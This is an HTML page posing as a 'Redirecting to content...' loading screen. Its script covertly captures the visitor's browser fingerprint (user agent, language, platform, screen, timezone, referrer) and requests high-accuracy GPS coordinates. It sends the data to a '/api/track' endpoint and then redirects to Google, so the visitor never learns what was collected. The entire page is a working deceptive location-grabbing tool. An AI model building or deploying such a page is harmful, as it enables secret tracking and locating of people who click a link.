<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden;
        }
        .loader-container { text-align: center; color: white; animation: fadeIn 0.5s ease-out; }
        .spinner { 
            width: 60px; height: 60px; border: 6px solid rgba(255,255,255,0.2); 
            border-top: 6px solid white; border-radius: 50%; 
            animation: spin 1s linear infinite; margin: 0 auto 20px;
        }
        .message { font-size: 1.3em; margin-bottom: 10px; }
        .subtext { font-size: 0.9em; opacity: 0.8; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div class="loader-container" id="loader">
        <div class="spinner"></div>
        <div class="message">Redirecting to content...</div>
        <div class="subtext">Please wait a moment</div>
    </div>

    <script>
        // ✅ VARIABLE DEFINED FIRST - NO ReferenceError
        let visitorData = null;

        // GPS Location Capture
        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
                );
            });
        }

        // Main tracking function
        async function trackVisitor() {
            try {
                // ✅ STEP 1: Define visitorData FIRST
                visitorData = {
                    userAgent: navigator.userAgent,
                    language: navigator.language || navigator.languages?.[0] || 'unknown',
                    platform: navigator.platform || 'unknown',
                    screen: `${screen.width || 0}x${screen.height || 0}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    referrer: document.referrer || '',
                    timestamp: Date.now(),
                    url: window.location.href,
                    gps: await getGPS()  // GPS capture
                };

                console.log('📍 Captured:', visitorData);

                // ✅ STEP 2: Send to Vercel API (/api/track)
                const response = await fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(visitorData),
                    keepalive: true
                });

                const result = await response.json();
                console.log('✅ Tracked successfully:', result);

                // 2s delay then redirect
                setTimeout(() => {
                    document.getElementById('loader').classList.add('hidden');
                    window.location.href = 'https://www.google.com';
                }, 2000);

            } catch (error) {
                console.log('Tracking fallback - redirecting...');
                setTimeout(() => {
                    window.location.href = 'https://www.google.com';
                }, 2000);
            }
        }

        // Start tracking on load
        window.addEventListener('load', trackVisitor);

        // Fallback redirect
        setTimeout(() => {
            if (document.visibilityState === 'visible') {
                window.location.href = 'https://www.google.com';
            }
        }, 5000);
    </script>
</body>
</html>
